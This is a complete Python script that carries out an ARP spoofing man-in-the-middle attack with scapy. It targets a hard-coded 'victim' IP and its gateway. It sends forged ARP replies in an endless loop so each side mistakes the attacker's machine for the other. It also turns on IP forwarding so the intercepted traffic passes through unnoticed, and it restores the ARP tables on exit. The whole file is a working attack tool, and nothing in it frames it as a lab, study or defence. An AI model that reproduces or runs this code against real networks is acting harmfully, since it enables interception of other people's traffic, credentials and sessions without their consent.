#!/usr/bin/env python3

import scapy.all as scapy
import time
import sys

# Configuration
TARGET_IP = "192.168.2.12"      # Victim IP
GATEWAY_IP = "192.168.2.254"    # Router/Gateway IP

def get_mac(ip):
    """
    Broadcasts an ARP Request to find the MAC address of a specific IP.

    :param ip: The IP address to query
    :return: The MAC address as a string
    """
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    
    # srp = Send and Receive Packet (at Layer 2)
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0] # [0] because srp returns a tuple (answered, unanswered)

    if answered_list:
        return answered_list[0][1].hwsrc # Return the MAC address from the response
    else:
        return None

def spoof(target_ip, spoof_ip):
    """
    Sends a spoofed ARP packet.

    :param target_ip: The IP address of the target machine
    :param spoof_ip: The IP address to spoof (the one we are pretending to be)
    """
    target_mac = get_mac(target_ip)
    if not target_mac:
        return

    # Create the ARP packet with Ethernet header (op=2 means ARP Reply)
    packet = scapy.Ether(dst=target_mac) / scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    
    # Send the packet
    scapy.sendp(packet, verbose=False)

def restore(dest_ip, source_ip):
    """
    Restores the ARP tables to their original state.

    :param dest_ip: The IP address of the destination machine
    :param source_ip: The IP address of the source machine
    """
    dest_mac = get_mac(dest_ip)
    source_mac = get_mac(source_ip)
    
    if dest_mac and source_mac:
        # Create the ARP packet with the correct MAC addresses
        packet = scapy.Ether(dst=dest_mac) / scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)

        # Send the packet multiple times to ensure restoration
        scapy.sendp(packet, count=4, verbose=False)

# Main Execution
if __name__ == "__main__":
    try:
        print(f"[*] Starting ARP Spoofer on {TARGET_IP} <--> {GATEWAY_IP}")
        
        # Enable IP Forwarding automatically (Linux only)
        try:
            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                f.write("1")
            print("[*] IP Forwarding enabled.")
        except Exception as e:
            print(f"[!] Could not enable IP forwarding automatically: {e}")
            print("[!] Please run: echo 1 > /proc/sys/net/ipv4/ip_forward")

        sent_packets_count = 0
        while True:
            # Tell the Victim that I am the Router
            spoof(TARGET_IP, GATEWAY_IP)
            
            # Tell the Router that I am the Victim
            spoof(GATEWAY_IP, TARGET_IP)
            
            sent_packets_count += 2
            print(f"\r[+] Packets sent: {sent_packets_count}", end="")
            
            time.sleep(0.1)

    except KeyboardInterrupt:
        print("\n[!] CTRL+C detected. Restoring ARP tables...")
        restore(TARGET_IP, GATEWAY_IP)
        restore(GATEWAY_IP, TARGET_IP)
        print("[+] Network restored. Exiting.")